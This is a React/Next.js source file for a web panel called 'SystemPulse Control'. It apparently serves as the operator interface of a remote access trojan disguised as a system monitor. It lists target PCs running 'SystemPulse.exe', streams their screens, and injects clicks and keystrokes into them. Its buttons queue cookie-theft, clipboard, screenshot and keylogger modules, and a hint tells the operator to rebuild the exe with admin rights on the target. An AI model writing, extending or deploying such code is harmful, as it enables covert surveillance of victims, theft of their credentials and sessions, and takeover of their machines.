"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import Link from "next/link";
import { MODULE_CATALOG } from "@/lib/modules";

type OnlineHost = {
  hostname: string;
  username: string;
  screen_width?: number;
  screen_height?: number;
};

type AvEvent = {
  id: number;
  module: string;
  payload: Record<string, unknown> | null;
  created_at: string;
};

const FRAME_POLL_MS = 75;
const DEFAULT_INTERVAL = 0.15;
const WHEEL_DELTA = 120;

function normalizeRemoteKey(key: string): string {
  const k = key.toLowerCase();
  const map: Record<string, string> = {
    arrowup: "up",
    arrowdown: "down",
    arrowleft: "left",
    arrowright: "right",
    " ": "space",
    control: "ctrl",
    meta: "win",
  };
  return map[k] || k;
}

function payloadFromKeyboardEvent(e: KeyboardEvent): Record<string, unknown> | null {
  const key = e.key;
  if (key === "Shift" || key === "Control" || key === "Alt" || key === "Meta") {
    const solo =
      key === "Shift" ? "shift" : key === "Control" ? "ctrl" : key === "Alt" ? "alt" : "win";
    return { action: "key", key: solo };
  }

  const mods: string[] = [];
  if (e.ctrlKey) mods.push("ctrl");
  if (e.altKey) mods.push("alt");
  if (e.shiftKey) mods.push("shift");
  if (e.metaKey) mods.push("win");

  const main = normalizeRemoteKey(key);
  if (mods.length) {
    if (main.length === 1) return { action: "combo", keys: [...mods, main] };
    if (main.startsWith("f") && main.length <= 3) return { action: "combo", keys: [...mods, main] };
    if (["enter", "tab", "esc", "escape", "backspace", "delete", "home", "end"].includes(main)) {
      return { action: "combo", keys: [...mods, main] };
    }
    return null;
  }

  if (main.length === 1) return { action: "key", key: main };
  const specials = new Set([
    "enter",
    "tab",
    "esc",
    "escape",
    "space",
    "backspace",
    "delete",
    "home",
    "end",
    "pageup",
    "pagedown",
    "up",
    "down",
    "left",
    "right",
    "win",
    "insert",
    "pause",
    "capslock",
  ]);
  if (specials.has(main) || /^f\d{1,2}$/.test(main)) {
    return { action: "key", key: main === "escape" ? "esc" : main };
  }
  return { action: "type", text: key };
}

function controlHeaders(pin: string): HeadersInit {
  const h: Record<string, string> = { "Content-Type": "application/json" };
  if (pin) h["x-control-pin"] = pin;
  return h;
}

async function controlFetch(
  path: string,
  pin: string,
  options: RequestInit = {},
): Promise<Response> {
  return fetch(path, {
    ...options,
    headers: { ...controlHeaders(pin), ...(options.headers as Record<string, string>) },
  });
}

function imageSrcFromEvent(event: AvEvent | null): string | null {
  if (!event?.payload) return null;
  const b64 = event.payload.image_base64;
  if (typeof b64 !== "string") return null;
  const fmt = event.payload.image_format === "jpeg" ? "jpeg" : "png";
  return `data:image/${fmt};base64,${b64}`;
}

export default function ControlPage() {
  const [pin, setPin] = useState("");
  const [pinOk, setPinOk] = useState(false);
  const [hosts, setHosts] = useState<OnlineHost[]>([]);
  const [selected, setSelected] = useState<string>("");
  const [liveOn, setLiveOn] = useState(false);
  const [intervalSec, setIntervalSec] = useState(DEFAULT_INTERVAL);
  const [frame, setFrame] = useState<AvEvent | null>(null);
  const [text, setText] = useState("");
  const [status, setStatus] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const [keysLive, setKeysLive] = useState(true);
  const imgRef = useRef<HTMLImageElement>(null);
  const liveWrapRef = useRef<HTMLDivElement>(null);
  const lastFrameId = useRef(0);
  const fpsCounter = useRef({ n: 0, t: Date.now() });

  const host = useMemo(
    () => hosts.find((h) => h.hostname === selected),
    [hosts, selected],
  );

  const screenW = Number(host?.screen_width || frame?.payload?.screen_width || 1920);
  const screenH = Number(host?.screen_height || frame?.payload?.screen_height || 1080);

  useEffect(() => {
    const saved = sessionStorage.getItem("sp-control-pin") || "";
    if (saved) {
      setPin(saved);
      setPinOk(true);
    }
  }, []);

  const refreshOnline = useCallback(async () => {
    if (!pinOk) return;
    try {
      const res = await controlFetch("/api/control/online", pin);
      if (!res.ok) {
        const body = await res.json().catch(() => ({}));
        throw new Error(
          typeof body.error === "string" ? body.error : `HTTP ${res.status}`,
        );
      }
      const data = await res.json();
      setHosts(data.hosts || []);
      setError(null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to load online hosts");
    }
  }, [pin, pinOk]);

  const refreshFrame = useCallback(async () => {
    if (!pinOk || !selected) return;
    try {
      const since = lastFrameId.current > 0 ? `&since_id=${lastFrameId.current}` : "";
      const res = await controlFetch(
        `/api/control/frame?hostname=${encodeURIComponent(selected)}${since}`,
        pin,
      );
      if (!res.ok) return;
      const data = await res.json();
      const event = data.event as AvEvent | null;
      if (!event?.payload?.image_base64) return;
      lastFrameId.current = event.id;
      setFrame(event);
      fpsCounter.current.n += 1;
      const now = Date.now();
      if (now - fpsCounter.current.t >= 1000) {
        setFps(fpsCounter.current.n);
        fpsCounter.current = { n: 0, t: now };
      }
    } catch {
      /* ignore */
    }
  }, [pinOk, selected, pin]);

  useEffect(() => {
    if (!pinOk) return;
    refreshOnline();
    const t = setInterval(refreshOnline, 3000);
    return () => clearInterval(t);
  }, [pinOk, refreshOnline]);

  useEffect(() => {
    if (!pinOk || !selected || !liveOn) return;
    refreshFrame();
    const t = setInterval(refreshFrame, FRAME_POLL_MS);
    return () => clearInterval(t);
  }, [pinOk, selected, liveOn, refreshFrame]);

  function queueInput(payload: Record<string, unknown>) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "input", payload }),
    }).catch(() => setStatus("Input queue failed"));
  }

  function runModule(module: string) {
    if (!selected) return;
    void controlFetch("/api/control/command", pin, {
      method: "POST",
      body: JSON.stringify({ hostname: selected, kind: "module", module }),
    });
    setStatus(`Queued ${module}`);
  }

  async function toggleLive(enabled: boolean) {
    if (!selected) return;
    const res = await controlFetch("/api/control/liveview", pin, {
      method: "PUT",
      body: JSON.stringify({ hostname: selected, enabled, interval: intervalSec }),
    });
    if (!res.ok) {
      setStatus(`Live view failed: ${await res.text()}`);
      return;
    }
    setLiveOn(enabled);
    if (enabled) {
      lastFrameId.current = 0;
      fpsCounter.current = { n: 0, t: Date.now() };
      refreshFrame();
      setStatus(`Turbo live ~${intervalSec}s capture · poll ${FRAME_POLL_MS}ms`);
    } else {
      setStatus("Live screen stopped");
      setFps(0);
    }
  }

  function screenCoords(ev: React.MouseEvent<HTMLElement>) {
    const img = imgRef.current;
    if (!img) return null;
    const rect = img.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;
    return {
      x: Math.round(((ev.clientX - rect.left) / rect.width) * screenW),
      y: Math.round(((ev.clientY - rect.top) / rect.height) * screenH),
    };
  }

  function onScreenClick(ev: React.MouseEvent<HTMLImageElement>) {
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "left", clicks: 1 });
  }

  function onScreenContextMenu(ev: React.MouseEvent<HTMLImageElement>) {
    ev.preventDefault();
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "right", clicks: 1 });
  }

  function onScreenDoubleClick(ev: React.MouseEvent<HTMLImageElement>) {
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    queueInput({ action: "click", x: pt.x, y: pt.y, button: "left", clicks: 2 });
  }

  function onScreenWheel(ev: React.WheelEvent<HTMLImageElement>) {
    ev.preventDefault();
    if (!selected) return;
    const pt = screenCoords(ev);
    if (!pt) return;
    const horizontal = ev.shiftKey || Math.abs(ev.deltaX) > Math.abs(ev.deltaY);
    const raw = horizontal ? ev.deltaX : ev.deltaY;
    if (raw === 0) return;
    const lines = Math.max(1, Math.round(Math.abs(raw) / 40));
    const delta =
      (horizontal ? (raw > 0 ? 1 : -1) : raw < 0 ? 1 : -1) * WHEEL_DELTA * lines;
    queueInput({
      action: "scroll",
      x: pt.x,
      y: pt.y,
      delta,
      horizontal,
    });
  }

  function onLiveKeyDown(ev: React.KeyboardEvent<HTMLDivElement>) {
    if (!keysLive || !selected) return;
    const target = ev.target as HTMLElement;
    if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") return;

    const payload = payloadFromKeyboardEvent(ev.nativeEvent);
    if (!payload) return;
    ev.preventDefault();
    ev.stopPropagation();
    queueInput(payload);
  }

  function sendCombo(keys: string[]) {
    queueInput({ action: "combo", keys });
  }

  function sendText() {
    if (!text.trim()) return;
    queueInput({ action: "type", text });
    setText("");
  }

  function tryPin() {
    sessionStorage.setItem("sp-control-pin", pin);
    setPinOk(true);
  }

  const preview = imageSrcFromEvent(frame);

  if (!pinOk) {
    return (
      <div className="shell control-shell">
        <div className="control-gate">
          <h1>Remote control</h1>
          <p>Optional PIN if set as <code>CONTROL_PIN</code> on Vercel.</p>
          <input
            className="control-input"
            type="password"
            placeholder="Control PIN (optional)"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && tryPin()}
          />
          <button className="btn btn-accent" onClick={tryPin}>
            Continue
          </button>
          <Link href="/" className="control-back">
            ← Dashboard
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="shell control-shell">
      <header className="topbar">
        <div className="brand-text">
          <h1>
            System<span>Pulse</span> Control
          </h1>
          <p>Turbo — ~0.15s frames · ~75ms refresh · scroll · Win key · combos</p>
        </div>
        <div className="topbar-right">
          {liveOn && fps > 0 && <span className="fps-pill">{fps} fps</span>}
          <Link href="/" className="btn">
            Dashboard
          </Link>
          <button className="btn btn-accent" onClick={refreshOnline}>
            Refresh online
          </button>
        </div>
      </header>

      {error && <div className="alert">{error}</div>}
      {status && <div className="control-status">{status}</div>}

      <div className="control-grid">
        <section className="panel control-panel">
          <div className="panel-title">Online PCs</div>
          {hosts.length === 0 ? (
            <p className="empty">No one online — open SystemPulse.exe on target PC.</p>
          ) : (
            <ul className="host-list">
              {hosts.map((h) => (
                <li key={h.hostname}>
                  <button
                    type="button"
                    className={`host-btn${selected === h.hostname ? " active" : ""}`}
                    onClick={() => {
                      setSelected(h.hostname);
                      setLiveOn(false);
                      setFrame(null);
                      lastFrameId.current = 0;
                    }}
                  >
                    <strong>{h.hostname}</strong>
                    <span>{h.username}</span>
                    {h.screen_width && h.screen_height && (
                      <span className="host-meta">
                        {h.screen_width}×{h.screen_height}
                      </span>
                    )}
                  </button>
                </li>
              ))}
            </ul>
          )}
        </section>

        <section className="panel control-panel control-main">
          <div className="panel-title">
            Live screen {selected ? `— ${selected}` : ""}
          </div>
          {!selected ? (
            <p className="empty">Select a PC from the list.</p>
          ) : (
            <>
              <div className="live-toolbar">
                <label>
                  Capture (s)
                  <input
                    type="number"
                    min={0.12}
                    max={15}
                    step={0.05}
                    value={intervalSec}
                    onChange={(e) => setIntervalSec(Number(e.target.value))}
                    className="control-input narrow"
                  />
                </label>
                {!liveOn ? (
                  <button className="btn btn-accent" onClick={() => toggleLive(true)}>
                    Start turbo live
                  </button>
                ) : (
                  <button className="btn" onClick={() => toggleLive(false)}>
                    Stop
                  </button>
                )}
              </div>
              <div
                ref={liveWrapRef}
                className={`live-frame-wrap${keysLive ? " live-focused" : ""}`}
                tabIndex={0}
                onKeyDown={onLiveKeyDown}
                onClick={() => liveWrapRef.current?.focus()}
              >
                {preview ? (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img
                    ref={imgRef}
                    src={preview}
                    alt="Live screen"
                    className="live-frame"
                    onClick={onScreenClick}
                    onContextMenu={onScreenContextMenu}
                    onDoubleClick={onScreenDoubleClick}
                    onWheel={onScreenWheel}
                    draggable={false}
                    title="Click · right-click · double-click · scroll wheel"
                  />
                ) : (
                  <div className="live-placeholder">
                    {liveOn ? "Waiting for first frame…" : "Start turbo live to see their desktop"}
                  </div>
                )}
              </div>
              <p className="control-hint">
                Screen {screenW}×{screenH} — click the live view then type (Win, Ctrl+C, arrows, F-keys).
                Scroll wheel over the image. Shift+scroll = horizontal. Rebuild exe + admin on target PC.
              </p>

              <label className="keys-live-toggle">
                <input
                  type="checkbox"
                  checked={keysLive}
                  onChange={(e) => setKeysLive(e.target.checked)}
                />
                Send keys to their PC when live view is focused
              </label>

              <div className="key-quick">
                {(
                  [
                    ["Win", ["win"]],
                    ["Win+D", ["win", "d"]],
                    ["Win+E", ["win", "e"]],
                    ["Win+R", ["win", "r"]],
                    ["Alt+Tab", ["alt", "tab"]],
                    ["Ctrl+C", ["ctrl", "c"]],
                    ["Ctrl+V", ["ctrl", "v"]],
                    ["Ctrl+A", ["ctrl", "a"]],
                    ["Tab", ["tab"]],
                    ["Esc", ["esc"]],
                    ["↑", ["up"]],
                    ["↓", ["down"]],
                    ["←", ["left"]],
                    ["→", ["right"]],
                  ] as const
                ).map(([label, keys]) => (
                  <button
                    key={label}
                    type="button"
                    className="btn btn-sm"
                    onClick={() => sendCombo([...keys])}
                  >
                    {label}
                  </button>
                ))}
              </div>

              <div className="control-row">
                <input
                  className="control-input flex"
                  value={text}
                  onChange={(e) => setText(e.target.value)}
                  placeholder="Type on their PC — Enter to send"
                  onKeyDown={(e) => {
                    if (e.key === "Enter") {
                      e.preventDefault();
                      sendText();
                    }
                  }}
                />
                <button className="btn btn-accent" onClick={sendText}>
                  Send
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "enter" })}>
                  Enter
                </button>
                <button className="btn" onClick={() => queueInput({ action: "key", key: "backspace" })}>
                  ⌫
                </button>
              </div>

              <div className="module-quick">
                {MODULE_CATALOG.filter((m) =>
                  ["screenshot", "clipboard", "cookies", "keylogger"].includes(m.id),
                ).map((m) => (
                  <button key={m.id} type="button" className="btn" onClick={() => runModule(m.id)}>
                    {m.label}
                  </button>
                ))}
              </div>
            </>
          )}
        </section>
      </div>
    </div>
  );
}
